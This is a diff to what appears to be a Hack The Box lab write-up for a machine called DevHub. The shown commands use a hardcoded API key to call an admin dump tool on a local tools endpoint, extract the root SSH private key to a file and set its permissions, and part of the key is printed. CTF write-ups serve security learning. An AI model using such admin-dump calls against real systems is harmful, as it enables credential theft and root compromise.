@@ -1969,7 +1969,6 @@ chmod 600 /tmp/root_id_rsa
 **Result:**
 
 ```shell
-
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
 └─$ curl -s http://localhost:15000/tools/call \
   -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
@@ -1977,10 +1976,6 @@ chmod 600 /tmp/root_id_rsa
   -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
 | python3 -c "import json,sys; print(json.load(sys.stdin)['root_private_key'])" \
 > /tmp/root_id_rsa
-
-┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
-└─$ ls /tmp/root_id_rsa                                   
-/tmp/root_id_rsa
 
 ┌──(kali㉿kali)-[~/nedmoeca/HTB/SN11/DevHub]
 └─$ chmod 600 /tmp/root_id_rsa
@@ -1995,8 +1990,9 @@ NhAAAAAwEAAQAAAQEAwWHw4Iv8yDwyqOacO5uB2OFr/RaD1TF192ptgJXu0vj5STypOUH9
 └─$ tail -3 /tmp/root_id_rsa
 lFORwv9PYfxftV8AAAALcm9vdEBkZXZodWI=
 -----END OPENSSH PRIVATE KEY-----
-
 ```
+
+The key file is now correctly formatted — proper headers, footers, and multi-line base64 content. Permissions are set to 600.
 <div align="center">
 <br>
 <br>
